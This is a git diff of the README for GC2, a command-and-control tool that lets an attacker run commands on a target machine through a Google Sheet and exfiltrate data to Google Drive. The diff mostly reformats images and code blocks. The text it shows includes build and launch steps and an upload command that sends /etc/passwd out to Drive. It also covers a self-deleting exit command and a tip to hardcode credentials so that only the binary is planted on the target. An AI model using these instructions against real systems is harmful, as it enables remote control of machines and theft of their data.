@@ -1,7 +1,7 @@
 # GC2
 
 <p align="center">
-  <img alt="Merlin Logo" src="img/GC2.png" height="30%" width="30%">
+  <img alt="Logo" src="img/GC2.png" height="30%" width="30%">
 </p>
 
 GC2 (Google Command and Control) is a Command and Control application that allows an attacker to execute commands on the target machine using Google Sheet and exfiltrates data using Google Drive.
@@ -19,8 +19,8 @@ PS: Please don't upload the compiled binary on VirusTotal :)
 1. **Build executable**
  
     ```bash
-    git clone <asdf>
-    cd <asdf>
+    git clone https://github.com/looCiprian/GC2-sheet
+    cd GC2-sheet
     go build gc2-sheet.go
     ```
 
@@ -36,16 +36,20 @@ PS: Please don't upload the compiled binary on VirusTotal :)
 
     Create a new Google Sheet and add the service account to the editor group of the spreadsheet (to add the service account use its email)
     
-    ![](img/sheet_permissions.png)
+    <p align="center">
+        <img alt="Sheet Permission" src="img/sheet_permissions.png" height="60%" width="60%">
+    </p>
     
     Create a new Google Drive folder and add the service account to the editor group of the folder (to add the service account use its email)
     
-    ![](img/drive_permissions.png)
+    <p align="center">
+        <img alt="Sheet Permission" src="img/drive_permissions.png" height="60%" width="60%">
+    </p>    
 
 4. **Start the C2**
 
-    ```bash
-    gc2-sheet --key <GCP service account credential in JSON> --sheet <Google sheet ID> --drive <Google drive ID>
+    ```
+    gc2-sheet --key <GCP service account credential file .JSON > --sheet <Google sheet ID> --drive <Google drive ID>
     ```
    
    PS: you can also hardcode the parameters in the code, so you will upload only the executable on the target machine (look at comments in root.go and authentication.go)
@@ -66,7 +70,7 @@ Commands must be inserted in the column "A", and the output will be printed in t
 
 Special commands are reserved to perform the upload and download to the target machine
 
- ```bash
+ ```
 From Target to Google Drive
 upload;<remote path>
 Example:
@@ -77,7 +81,7 @@ upload;/etc/passwd
 
 Special commands are reserved to perform the upload and download to the target machine
 
- ```bash
+ ```
  From Google Drive to Target
 download;<google drive file id>;<remote path>
 Example:
@@ -90,6 +94,12 @@ By sending the command *exit*, the program will delete itself from the target an
 
 PS: From *os* documentation: 
 *If a symlink was used to start the process, depending on the operating system, the result might be the symlink or the path it pointed to*. In this case the symlink is deleted.
+
+### WorkFlow
+
+<p align="center">
+  <img alt="Work Flow" src="img/GC2-workflow.png" height="60%" width="60%">
+</p>
 
 # Demo
 
